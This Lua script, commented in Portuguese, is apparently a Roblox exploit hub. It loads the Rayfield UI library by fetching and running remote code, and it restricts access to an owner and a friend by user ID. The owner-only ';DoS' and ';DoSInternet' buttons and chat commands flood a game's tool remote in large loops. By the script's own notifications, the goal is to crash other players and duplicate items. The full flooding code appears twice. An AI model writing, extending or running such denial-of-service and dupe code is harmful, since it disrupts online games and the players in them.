-- Carrega a Library do Rayfield
local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/refs/heads/main/source.lua"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- CONFIGURAÇÃO DOS IDS
local ID_DONO = 9008578450  -- COLOQUE O SEU ID AQUI
local ID_AMIGO = 87654321 -- COLOQUE O ID DO SEU AMIGO AQUI

-- Tabela de permissão geral para abrir o Hub
local IDsAutorizados = {
    [ID_DONO] = true,
    [ID_AMIGO] = true
}

-- Segurança: Se quem executou não estiver na lista, o script fecha imediatamente
if not IDsAutorizados[LocalPlayer.UserId] then
    return
end

-- Janela Principal do Hub
local Window = Rayfield:CreateWindow({
   Name = "MagN Hub Panel",
   LoadingTitle = "Autenticando Usuário...",
   LoadingSubtitle = "Uso Restrito",
   ConfigurationSaving = { Enabled = false },
   KeySystem = false
})

local MainTab = Window:CreateTab("Comandos", 4483362458)
-- ==========================================
-- ABA 1: MODERAÇÃO LEVE (Acessível por Você e pelo Amigo)
-- ==========================================
local SectionLeve = MainTab:CreateSection("Moderação Leve")
local AlvoSelecionado = ""

MainTab:CreateInput({
   Name = "Nome do Alvo",
   PlaceholderText = "Digite o nome...",
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
       AlvoSelecionado = Text
   end,
})

MainTab:CreateButton({
   Name = ";fling",
   Callback = function()
       if AlvoSelecionado ~= "" then
           print("Executando fling via botão no alvo: " .. AlvoSelecionado)
           Rayfield:Notify({
               Title = "Moderação Leve",
               Content = "Comando Fling enviado para: " .. AlvoSelecionado,
               Duration = 4
           })
       end
   end,
})

-- ==========================================
-- ABA 2: PAINEL ULTRA PRIVADO (Apenas se o ID for o do Dono)
-- ==========================================
if LocalPlayer.UserId == ID_DONO then
    local SectionPainel = MainTab:CreateSection("Moderação Pesada")

    MainTab:CreateButton({
       Name = ";DoS",
       Callback = function()
            local player = game:GetService("Players").LocalPlayer
            if not player then return end
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local starterGui = game:GetService("StarterGui")

            local character = player.Character or player.CharacterAdded:Wait()
            local rootpart = character:WaitForChild("HumanoidRootPart", 10)
            if not rootpart then 
                pcall(function() starterGui:SetCore("SendNotification", { Title = "Erro", Text = "HumanoidRootPart não encontrado.", Button1 = "Ok", Duration = 5 }) end)
                return 
            end
            local oldcf = rootpart.CFrame

            local re = replicatedStorage:FindFirstChild("RE")
            local toolRemote = re and re:FindFirstChild("1Too1l")

            if not toolRemote then 
                pcall(function() starterGui:SetCore("SendNotification", { Title = "Erro", Text = "Remote funcional não encontrado.", Button1 = "Ok", Duration = 5 }) end)
                return 
            end

            pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)

            task.spawn(function()
                for m = 1, 999999 do
                    task.spawn(function()
                        if toolRemote:IsA("RemoteFunction") then
                            toolRemote:InvokeServer("PickingTools", "FireHose")
                        else
                            toolRemote:FireServer("PickingTools", "FireHose")
                        end
                    end)

                    local backpack = player:FindFirstChild("Backpack")
                    if backpack then
                        local fireHose = backpack:FindFirstChild("FireHose")
                        if fireHose and fireHose:FindFirstChild("ToolSound") then
                            fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                        end
                    end
                    if m % 15 == 0 then task.wait(0.1) end
                end
            end)

            task.wait(0.4)
            player.CharacterRemoving:Wait()
            local newCharacter = player.CharacterAdded:Wait()
            local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
            local humanoid = newCharacter:WaitForChild("Humanoid", 15)

            if newRootPart and humanoid then
                task.wait(0.7)
                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                newRootPart.CFrame = oldcf
                newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end

            pcall(function() starterGui:SetCore("SendNotification", { Title = "Script de Dupe", Text = "Concluído, Equipando Itens...", Button1 = "Ok", Duration = 5 }) end)
            task.wait(0.5)

            local backpack = player:WaitForChild("Backpack", 10)
            if backpack then
                local items = backpack:GetChildren()
                local equipCount = 0
                for i = 1, #items do
                    local item = items[i]
                    if item:IsA("Tool") and item.Name == "FireHose" then
                        equipCount = equipCount + 1
                        task.defer(function() item.Parent = newCharacter end)
                        if equipCount % 8 == 0 then task.wait(0.02) end 
                    end
                end
            end
            task.wait(0.5)
            pcall(function() starterGui:SetCore("SendNotification", { Title = "Script de Dupe", Text = "Finalizando processo...", Button1 = "Ok", Duration = 5 }) end)
       end,
    })

    MainTab:CreateButton({
       Name = ";DoSInternet",
       Callback = function()
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
            local backpack = LocalPlayer:WaitForChild("Backpack") 
            local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE") 
            local toolRemote = remoteStorage:FindFirstChild("1Too1l") 
            
            if toolRemote and toolRemote:IsA("RemoteFunction") then 
                local args1 = { "PickingTools" , "FireHose" } 
                local args2 = { "FireHose" , "DestroyFireHose" } 
                
                for i = 1, 30 do 
                    task.spawn(function() 
                        for m = 1, 289 do 
                            pcall(function() toolRemote:InvokeServer(unpack(args1)) end) 
                            if m % 40 == 0 then task.wait() end 
                        end 
                        
                        task.spawn(function() 
                            local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose") 
                            if fireHose then 
                                local toolSound = fireHose:FindFirstChild("ToolSound") 
                                if toolSound then pcall(function() toolSound:FireServer(unpack(args2)) end) end 
                            end 
                        end) 
                    end) 
                    task.wait(0.05) 
                end 
            end 
       end,
    })
end
-- ==========================================
-- SISTEMA DE ESCUTA DE CHAT COM VALIDAÇÃO DE CARGO
-- ==========================================
local function OuvirChat(Jogador, Mensagem)
    -- 1. Comando público para os 2 usuários da Whitelist
    if IDsAutorizados[Jogador.UserId] then
        if string.sub(Mensagem, 1, 7) == ";fling " then
            local NomeDoAlvo = string.sub(Mensagem, 8)
            if NomeDoAlvo and NomeDoAlvo ~= "" then
                print("Executando fling via chat para o alvo: " .. NomeDoAlvo)
                Rayfield:Notify({
                    Title = "Comando de Chat",
                    Content = "Fling ativado via chat para: " .. NomeDoAlvo,
                    Duration = 4
                })
            end
        end
    end
    
    -- 2. Comandos restritos estritamente ao seu ID de Dono
    if Jogador.UserId == ID_DONO then
        if Mensagem == ";DoS" then
            local player = game:GetService("Players").LocalPlayer
            if not player then return end
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local starterGui = game:GetService("StarterGui")

            local character = player.Character or player.CharacterAdded:Wait()
            local rootpart = character:WaitForChild("HumanoidRootPart", 10)
            if not rootpart then return end
            local oldcf = rootpart.CFrame

            local re = replicatedStorage:FindFirstChild("RE")
            local toolRemote = re and re:FindFirstChild("1Too1l")
            if not toolRemote then return end

            pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)

            task.spawn(function()
                for m = 1, 999999 do
                    task.spawn(function()
                        if toolRemote:IsA("RemoteFunction") then
                            toolRemote:InvokeServer("PickingTools", "FireHose")
                        else
                            toolRemote:FireServer("PickingTools", "FireHose")
                        end
                    end)

                    local backpack = player:FindFirstChild("Backpack")
                    if backpack then
                        local fireHose = backpack:FindFirstChild("FireHose")
                        if fireHose and fireHose:FindFirstChild("ToolSound") then
                            fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                        end
                    end
                    if m % 15 == 0 then task.wait(0.1) end
                end
            end)

            task.wait(0.4)
            player.CharacterRemoving:Wait()
            local newCharacter = player.CharacterAdded:Wait()
            local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
            local humanoid = newCharacter:WaitForChild("Humanoid", 15)

            if newRootPart and humanoid then
                task.wait(0.7)
                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                newRootPart.CFrame = oldcf
                newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end

            local backpack = player:WaitForChild("Backpack", 10)
            if backpack then
                local items = backpack:GetChildren()
                local equipCount = 0
                for i = 1, #items do
                    local item = items[i]
                    if item:IsA("Tool") and item.Name == "FireHose" then
                        equipCount = equipCount + 1
                        task.defer(function() item.Parent = newCharacter end)
                        if equipCount % 8 == 0 then task.wait(0.02) end 
                    end
                end
            end

            Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Normal) ativado com sucesso.", Duration = 4 })
            
        elseif Mensagem == ";DoSInternet" then
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
            local backpack = LocalPlayer:WaitForChild("Backpack") 
            local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE") 
            local toolRemote = remoteStorage:FindFirstChild("1Too1l") 
            
            if toolRemote and toolRemote:IsA("RemoteFunction") then 
                local args1 = { "PickingTools" , "FireHose" } 
                local args2 = { "FireHose" , "DestroyFireHose" } 
                
                for i = 1, 30 do 
                    task.spawn(function() 
                        for m = 1, 289 do 
                            pcall(function() toolRemote:InvokeServer(unpack(args1)) end) 
                            if m % 40 == 0 then task.wait() end 
                        end 
                        task.spawn(function() 
                            local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose") 
                            if fireHose then 
                                local toolSound = fireHose:FindFirstChild("ToolSound") 
                                if toolSound then pcall(function() toolSound:FireServer(unpack(args2)) end) end 
                            end 
                        end) 
                    end) 
                    task.wait(0.05) 
                end 
            end

            Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Internet) ativado com sucesso.", Duration = 4 })
        end
    end
end

-- Conecta os loops de eventos ao Chat do Roblox
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg) OuvirChat(player, msg) end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) OuvirChat(player, msg) end)
end)